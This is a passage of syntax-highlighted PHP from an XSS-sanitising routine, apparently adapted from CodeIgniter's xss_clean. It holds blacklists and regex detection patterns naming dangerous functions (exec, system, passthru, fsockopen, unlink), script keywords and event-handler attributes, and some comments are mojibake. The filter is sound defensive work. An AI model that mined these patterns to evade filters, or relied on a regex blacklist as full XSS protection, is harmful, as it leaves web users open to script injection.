</span></span><span class="line"><span class="cl">                    <span class="nv">$str</span> <span class="o">=</span> <span class="nx">rawurldecode</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$str</span> <span class="o">=</span> <span class="nx">preg_replace_callback</span><span class="p">(</span><span class="s1">&#39;#%(?:\s*[0-9a-f]){2,}#i&#39;</span><span class="p">,</span> <span class="p">[</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;_urldecodespaces&#39;</span><span class="p">],</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">while</span> <span class="p">(</span><span class="nv">$oldstr</span> <span class="o">!==</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nx">unset</span><span class="p">(</span><span class="nv">$oldstr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">             * Convert character entities to ASCII
</span></span></span><span class="line"><span class="cl"><span class="cm">             *
</span></span></span><span class="line"><span class="cl"><span class="cm">             * This permits our tests below to work reliably.
</span></span></span><span class="line"><span class="cl"><span class="cm">             * We only convert entities that are within tags since
</span></span></span><span class="line"><span class="cl"><span class="cm">             * these are the ones that will pose security problems.
</span></span></span><span class="line"><span class="cl"><span class="cm">             */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// ‰∏çËøõË°å‰∫åÊ¨°ÁºñÁ†ÅÁöÑxssËøáÊª§
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$str</span> <span class="o">=</span> <span class="nx">preg_replace_callback</span><span class="p">(</span><span class="s2">&#34;/[^a-z0-9&gt;]+[a-z0-9]+=([\&#39;</span><span class="se">\&#34;</span><span class="s2">]).*?</span><span class="se">\\</span><span class="s2">1/si&#34;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;_convert_attribute&#39;</span><span class="p">),</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$str</span> <span class="o">=</span> <span class="nx">preg_replace_callback</span><span class="p">(</span><span class="s1">&#39;/&lt;\w+.*/si&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;_decode_entity&#39;</span><span class="p">),</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// Remove Invisible Characters Again!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nv">$str</span> <span class="o">=</span> <span class="nx">remove_invisible_characters</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * Convert all tabs to spaces
</span></span></span><span class="line"><span class="cl"><span class="cm">		 *
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * This prevents strings like this: ja	vascript
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * NOTE: we deal with spaces between characters later.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * NOTE: preg_replace was found to be amazingly slow here on
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * large blocks of data, so we use str_replace.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$str</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\t</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// Capture converted string for later comparison
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nv">$converted_string</span> <span class="o">=</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// Remove Strings that are never allowed
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="c1">//$str = $this-&gt;_do_never_allowed($str);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * Makes PHP tags safe
</span></span></span><span class="line"><span class="cl"><span class="cm">		 *
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * Note: XML tags are inadvertently replaced too:
</span></span></span><span class="line"><span class="cl"><span class="cm">		 *
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * &lt;?xml
</span></span></span><span class="line"><span class="cl"><span class="cm">		 *
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * But it doesn&#39;t seem to pose a problem.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$is_image</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="c1">// Images have a tendency to have the PHP short opening and
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="c1">// closing tags every so often so we skip those and only
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="c1">// do the long opening tags.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nv">$str</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/&lt;\?(php)/i&#39;</span><span class="p">,</span> <span class="s1">&#39;&amp;lt;?\\1&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">else</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$str</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">([</span><span class="s1">&#39;&lt;?&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="o">.</span><span class="s1">&#39;&gt;&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s1">&#39;&amp;lt;?&#39;</span><span class="p">,</span> <span class="s1">&#39;?&amp;gt;&#39;</span><span class="p">],</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * Compact any exploded words
</span></span></span><span class="line"><span class="cl"><span class="cm">		 *
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * This corrects words like:  j a v a s c r i p t
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * These words are compacted back to their correct state.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$words</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;javascript&#39;</span><span class="p">,</span> <span class="s1">&#39;expression&#39;</span><span class="p">,</span> <span class="s1">&#39;vbscript&#39;</span><span class="p">,</span> <span class="s1">&#39;jscript&#39;</span><span class="p">,</span> <span class="s1">&#39;wscript&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;vbs&#39;</span><span class="p">,</span> <span class="s1">&#39;script&#39;</span><span class="p">,</span> <span class="s1">&#39;base64&#39;</span><span class="p">,</span> <span class="s1">&#39;applet&#39;</span><span class="p">,</span> <span class="s1">&#39;alert&#39;</span><span class="p">,</span> <span class="s1">&#39;document&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;write&#39;</span><span class="p">,</span> <span class="s1">&#39;cookie&#39;</span><span class="p">,</span> <span class="s1">&#39;window&#39;</span><span class="p">,</span> <span class="s1">&#39;confirm&#39;</span><span class="p">,</span> <span class="s1">&#39;prompt&#39;</span><span class="p">,</span> <span class="s1">&#39;eval&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">foreach</span> <span class="p">(</span><span class="nv">$words</span> <span class="k">as</span> <span class="nv">$word</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$word</span> <span class="o">=</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;\s*&#39;</span><span class="p">,</span> <span class="nx">str_split</span><span class="p">(</span><span class="nv">$word</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;\s*&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="c1">// We only want to do this when it is followed by a non-word character
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="c1">// That way valid stuff like &#34;dealer to&#34; does not become &#34;dealerto&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nv">$str</span> <span class="o">=</span> <span class="nx">preg_replace_callback</span><span class="p">(</span><span class="s1">&#39;#(&#39;</span><span class="o">.</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$word</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">3</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;)(\W)#is&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;_compact_exploded_words&#39;</span><span class="p">),</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * Remove disallowed Javascript in links or img tags
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * We used to do some version comparisons and use of stripos(),
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * but it is dog slow compared to these simplified non-capturing
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * preg_match(), especially if the pattern exists in the string
</span></span></span><span class="line"><span class="cl"><span class="cm">		 *
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * Note: It was reported that not only space characters, but all in
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * the following pattern can be parsed as separators between a tag name
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * and its attributes: [\d\s&#34;\&#39;`;,\/\=\(\x00\x0B\x09\x0C]
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * ... however, remove_invisible_characters() above already strips the
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * hex-encoded ones, so we&#39;ll skip them below.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="k">do</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$original</span> <span class="o">=</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/&lt;a/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">			<span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nv">$str</span> <span class="o">=</span> <span class="nx">preg_replace_callback</span><span class="p">(</span><span class="s1">&#39;#&lt;a(?:rea)?[^a-z0-9&gt;]+([^&gt;]*?)(?:&gt;|$)#si&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;_js_link_removal&#39;</span><span class="p">),</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/&lt;img/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">			<span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nv">$str</span> <span class="o">=</span> <span class="nx">preg_replace_callback</span><span class="p">(</span><span class="s1">&#39;#&lt;img[^a-z0-9]+([^&gt;]*?)(?:\s?/?&gt;|$)#si&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;_js_img_removal&#39;</span><span class="p">),</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/script|xss/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">			<span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nv">$str</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;#&lt;/*(?:script|xss).*?&gt;#si&#39;</span><span class="p">,</span> <span class="s1">&#39;[xss_clean]&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">while</span> <span class="p">(</span><span class="nv">$original</span> <span class="o">!==</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nx">unset</span><span class="p">(</span><span class="nv">$original</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * Sanitize naughty HTML elements
</span></span></span><span class="line"><span class="cl"><span class="cm">		 *
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * If a tag containing any of the words in the list
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * below is found, the tag gets converted to entities.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 *
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * So this: &lt;blink&gt;
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * Becomes: &amp;lt;blink&amp;gt;
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">&#39;#&#39;</span>
</span></span><span class="line"><span class="cl">			<span class="o">.</span><span class="s1">&#39;&lt;((?&lt;slash&gt;/*\s*)((?&lt;tagName&gt;[a-z0-9]+)(?=[^a-z0-9]|$)|.+)&#39;</span> <span class="c1">// tag start and name, followed by a non-tag character
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="o">.</span><span class="s1">&#39;[^\s\042\047a-z0-9&gt;/=]*&#39;</span> <span class="c1">// a valid attribute character immediately after the tag would count as a separator
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="c1">// optional attributes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="o">.</span><span class="s1">&#39;(?&lt;attributes&gt;(?:[\s\042\047/=]*&#39;</span> <span class="c1">// non-attribute characters, excluding &gt; (tag close) for obvious reasons
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="o">.</span><span class="s1">&#39;[^\s\042\047&gt;/=]+&#39;</span> <span class="c1">// attribute characters
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="c1">// optional attribute-value
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				<span class="o">.</span><span class="s1">&#39;(?:\s*=&#39;</span> <span class="c1">// attribute-value separator
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>					<span class="o">.</span><span class="s1">&#39;(?:[^\s\042\047=&gt;&lt;`]+|\s*\042[^\042]*\042|\s*\047[^\047]*\047|\s*(?U:[^\s\042\047=&gt;&lt;`]*))&#39;</span> <span class="c1">// single, double or non-quoted value
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				<span class="o">.</span><span class="s1">&#39;)?&#39;</span> <span class="c1">// end optional attribute-value group
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="o">.</span><span class="s1">&#39;)*)&#39;</span> <span class="c1">// end optional attributes group
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="o">.</span><span class="s1">&#39;[^&gt;]*)(?&lt;closeTag&gt;\&gt;)?#isS&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// Note: It would be nice to optimize this for speed, BUT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="c1">//       only matching the naughty elements here results in
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="c1">//       false positives and in turn - vulnerabilities!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">do</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$old_str</span> <span class="o">=</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$str</span> <span class="o">=</span> <span class="nx">preg_replace_callback</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;_sanitize_naughty_html&#39;</span><span class="p">),</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">while</span> <span class="p">(</span><span class="nv">$old_str</span> <span class="o">!==</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nx">unset</span><span class="p">(</span><span class="nv">$old_str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * Sanitize naughty scripting elements
</span></span></span><span class="line"><span class="cl"><span class="cm">		 *
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * Similar to above, only instead of looking for
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * tags it looks for PHP and JavaScript commands
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * that are disallowed. Rather than removing the
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * code, it simply converts the parenthesis to entities
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * rendering the code un-executable.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 *
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * For example:	eval(&#39;some code&#39;)
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * Becomes:	eval&amp;#40;&#39;some code&#39;&amp;#41;
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$str</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">			<span class="s1">&#39;#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s1">&#39;\\1\\2&amp;#40;\\3&amp;#41;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$str</span>
</span></span><span class="line"><span class="cl">		<span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// Same thing, but for &#34;tag functions&#34; (e.g. eval`some code`)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="c1">// See https://github.com/bcit-ci/CodeIgniter/issues/5420
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nv">$str</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">			<span class="s1">&#39;#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)`(.*?)`#si&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s1">&#39;\\1\\2&amp;#96;\\3&amp;#96;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$str</span>
</span></span><span class="line"><span class="cl">		<span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">//ÊúÄÁªàÊ∏ÖÁêÜ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">////ËøôÂ¢ûÂä†‰∫Ü‰∏ÄÁÇπÈ¢ùÂ§ñÁöÑÈ¢ÑÈò≤Êé™ÊñΩ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">////Êúâ‰∏úË•øÈÄöËøá‰∫Ü‰∏äÈù¢ÁöÑËøáÊª§Âô®
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nv">$str</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_do_never_allowed</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// now the only remaining whitespace attacks are \t, \n, and \r
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$ra</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;onabort&#39;</span><span class="p">,</span> <span class="s1">&#39;onactivate&#39;</span><span class="p">,</span> <span class="s1">&#39;onafterprint&#39;</span><span class="p">,</span> <span class="s1">&#39;onafterupdate&#39;</span><span class="p">,</span> <span class="s1">&#39;onbeforeactivate&#39;</span><span class="p">,</span> <span class="s1">&#39;onbeforecopy&#39;</span><span class="p">,</span> <span class="s1">&#39;onbeforecut&#39;</span><span class="p">,</span> <span class="s1">&#39;onbeforedeactivate&#39;</span><span class="p">,</span> <span class="s1">&#39;onbeforeeditfocus&#39;</span><span class="p">,</span> <span class="s1">&#39;onbeforepaste&#39;</span><span class="p">,</span> <span class="s1">&#39;onbeforeprint&#39;</span><span class="p">,</span> <span class="s1">&#39;onbeforeunload&#39;</span><span class="p">,</span> <span class="s1">&#39;onbeforeupdate&#39;</span><span class="p">,</span> <span class="s1">&#39;onblur&#39;</span><span class="p">,</span> <span class="s1">&#39;onbounce&#39;</span><span class="p">,</span> <span class="s1">&#39;oncellchange&#39;</span><span class="p">,</span> <span class="s1">&#39;onchange&#39;</span><span class="p">,</span> <span class="s1">&#39;onclick&#39;</span><span class="p">,</span> <span class="s1">&#39;oncontextmenu&#39;</span><span class="p">,</span> <span class="s1">&#39;oncontrolselect&#39;</span><span class="p">,</span> <span class="s1">&#39;oncopy&#39;</span><span class="p">,</span> <span class="s1">&#39;oncut&#39;</span><span class="p">,</span> <span class="s1">&#39;ondataavailable&#39;</span><span class="p">,</span> <span class="s1">&#39;ondatasetchanged&#39;</span><span class="p">,</span> <span class="s1">&#39;ondatasetcomplete&#39;</span><span class="p">,</span> <span class="s1">&#39;ondblclick&#39;</span><span class="p">,</span> <span class="s1">&#39;ondeactivate&#39;</span><span class="p">,</span> <span class="s1">&#39;ondrag&#39;</span><span class="p">,</span> <span class="s1">&#39;ondragend&#39;</span><span class="p">,</span> <span class="s1">&#39;ondragenter&#39;</span><span class="p">,</span> <span class="s1">&#39;ondragleave&#39;</span><span class="p">,</span> <span class="s1">&#39;ondragover&#39;</span><span class="p">,</span> <span class="s1">&#39;ondragstart&#39;</span><span class="p">,</span> <span class="s1">&#39;ondrop&#39;</span><span class="p">,</span> <span class="s1">&#39;onerror&#39;</span><span class="p">,</span> <span class="s1">&#39;onerrorupdate&#39;</span><span class="p">,</span> <span class="s1">&#39;onfilterchange&#39;</span><span class="p">,</span> <span class="s1">&#39;onfinish&#39;</span><span class="p">,</span> <span class="s1">&#39;onfocus&#39;</span><span class="p">,</span> <span class="s1">&#39;onfocusin&#39;</span><span class="p">,</span> <span class="s1">&#39;onfocusout&#39;</span><span class="p">,</span> <span class="s1">&#39;onhelp&#39;</span><span class="p">,</span> <span class="s1">&#39;onkeydown&#39;</span><span class="p">,</span> <span class="s1">&#39;onkeypress&#39;</span><span class="p">,</span> <span class="s1">&#39;onkeyup&#39;</span><span class="p">,</span> <span class="s1">&#39;onlayoutcomplete&#39;</span><span class="p">,</span> <span class="s1">&#39;onload&#39;</span><span class="p">,</span> <span class="s1">&#39;onlosecapture&#39;</span><span class="p">,</span> <span class="s1">&#39;onmousedown&#39;</span><span class="p">,</span> <span class="s1">&#39;onmouseenter&#39;</span><span class="p">,</span> <span class="s1">&#39;onmouseleave&#39;</span><span class="p">,</span> <span class="s1">&#39;onmousemove&#39;</span><span class="p">,</span> <span class="s1">&#39;onmouseout&#39;</span><span class="p">,</span> <span class="s1">&#39;onmouseover&#39;</span><span class="p">,</span> <span class="s1">&#39;onmouseup&#39;</span><span class="p">,</span> <span class="s1">&#39;onmousewheel&#39;</span><span class="p">,</span> <span class="s1">&#39;onmove&#39;</span><span class="p">,</span> <span class="s1">&#39;onmoveend&#39;</span><span class="p">,</span> <span class="s1">&#39;onmovestart&#39;</span><span class="p">,</span> <span class="s1">&#39;onpaste&#39;</span><span class="p">,</span> <span class="s1">&#39;onpropertychange&#39;</span><span class="p">,</span> <span class="s1">&#39;onreadystatechange&#39;</span><span class="p">,</span> <span class="s1">&#39;onreset&#39;</span><span class="p">,</span> <span class="s1">&#39;onresize&#39;</span><span class="p">,</span> <span class="s1">&#39;onresizeend&#39;</span><span class="p">,</span> <span class="s1">&#39;onresizestart&#39;</span><span class="p">,</span> <span class="s1">&#39;onrowenter&#39;</span><span class="p">,</span> <span class="s1">&#39;onrowexit&#39;</span><span class="p">,</span> <span class="s1">&#39;onrowsdelete&#39;</span><span class="p">,</span> <span class="s1">&#39;onrowsinserted&#39;</span><span class="p">,</span> <span class="s1">&#39;onscroll&#39;</span><span class="p">,</span> <span class="s1">&#39;onselect&#39;</span><span class="p">,</span> <span class="s1">&#39;onselectionchange&#39;</span><span class="p">,</span> <span class="s1">&#39;onselectstart&#39;</span><span class="p">,</span> <span class="s1">&#39;onstart&#39;</span><span class="p">,</span> <span class="s1">&#39;onstop&#39;</span><span class="p">,</span> <span class="s1">&#39;onsubmit&#39;</span><span class="p">,</span> <span class="s1">&#39;onunload&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$ra</span> <span class="k">as</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$str</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="nv">$t</span><span class="o">.</span><span class="s1">&#39;=&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="o">.</span><span class="nv">$t</span><span class="o">.</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// --------------------------------------------------------------------
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * Do Never Allowed
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * @used-by	CI_Security::xss_clean()
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * @param 	string
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * @return 	string
</span></span></span><span class="line"><span class="cl"><span class="sd">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">protected</span> <span class="k">function</span> <span class="nf">_do_never_allowed</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$str</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nx">array_keys</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_never_call_str</span><span class="p">),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_never_call_str</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
